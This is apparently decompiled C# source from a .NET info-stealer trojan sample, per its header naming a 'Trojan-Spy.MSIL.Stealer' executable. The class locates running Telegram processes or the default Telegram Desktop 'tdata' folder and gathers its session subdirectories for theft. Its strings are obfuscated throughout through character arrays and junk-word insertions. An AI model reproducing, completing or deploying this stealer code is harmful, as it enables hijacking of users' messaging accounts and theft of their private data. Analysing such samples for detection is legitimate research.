// Decompiled with JetBrains decompiler
// Type: SystemDiagnosticsOrdinalCaseInsensitiveComparerN
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;

public class SystemDiagnosticsOrdinalCaseInsensitiveComparerN : 
  MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd
{
  public object PassedPaths { get; set; } = (object) new List<string>();

  public override string Id2(SystemDataXSDSchemaNameTypeE scannerArg, FileInfo fileInfo)
  {
    string str = new string(new char[15]
    {
      'P',
      'r',
      'o',
      'f',
      'i',
      'l',
      'e',
      '_',
      'U',
      'n',
      'k',
      'n',
      'o',
      'w',
      'n'
    });
    try
    {
      DirectoryInfo directory = fileInfo.Directory;
      string empty = string.Empty;
      if (directory.Name != new string(new char[5]
      {
        't',
        'd',
        'a',
        't',
        'a'
      }))
        empty = directory.FullName.Split(new string[1]
        {
          new string(new char[5]{ 't', 'd', 'a', 't', 'a' })
        }, StringSplitOptions.RemoveEmptyEntries)[1];
      return new string(new char[8]
      {
        'P',
        'r',
        'o',
        'f',
        'i',
        'l',
        'e',
        '_'
      }) + scannerArg.Id5 + (string.IsNullOrWhiteSpace(empty) ? "" : "\\" + empty);
    }
    catch
    {
    }
    return str;
  }

  public override IEnumerable<SystemDataXSDSchemaNameTypeE> Id3()
  {
    List<SystemDataXSDSchemaNameTypeE> xsdSchemaNameTypeEList = new List<SystemDataXSDSchemaNameTypeE>();
    try
    {
      int num = 1;
      string[] parts = new string[9]
      {
        "T",
        "e",
        "l",
        "e",
        "gr",
        "am",
        ".",
        "ex",
        "e"
      };
      foreach (string fileName in SystemCollectionsGenericSortedSetEqualityComparers.GetProcessesByName(parts))
      {
        try
        {
          xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
          {
            Id5 = num.ToString(),
            Id2 = new string(new char[1]{ '*' }),
            Id1 = new FileInfo(fileName).Directory.FullName + new string(new char[6]
            {
              '\\',
              't',
              'd',
              'a',
              't',
              'a'
            }),
            Id3 = false
          });
          string fullName = new FileInfo(fileName).Directory.FullName;
          string str = new string(new char[6]
          {
            '\\',
            't',
            'd',
            'a',
            't',
            'a'
          });
          foreach (string directory in Directory.GetDirectories(fullName + str))
          {
            if (new DirectoryInfo(directory).Name.Length == 16)
              xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
              {
                Id5 = num.ToString(),
                Id2 = new string(new char[1]{ '*' }),
                Id1 = directory,
                Id3 = false
              });
          }
          ++num;
        }
        catch (Exception ex)
        {
        }
      }
      if (xsdSchemaNameTypeEList.Count == 0)
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\TeEnvironmentlegraEnvironmentm DEnvironmentesktoEnvironmentp\\tdEnvironmentata".Replace("Environment", string.Empty);
        xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
        {
          Id5 = num.ToString(),
          Id2 = new string(new char[1]{ '*' }),
          Id1 = path,
          Id3 = false
        });
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (new DirectoryInfo(directory).Name.Length == 16)
            xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
            {
              Id5 = num.ToString(),
              Id2 = new string(new char[1]{ '*' }),
              Id1 = directory,
              Id3 = false
            });
        }
      }
    }
    catch
    {
    }
    return (IEnumerable<SystemDataXSDSchemaNameTypeE>) xsdSchemaNameTypeEList;
  }
}
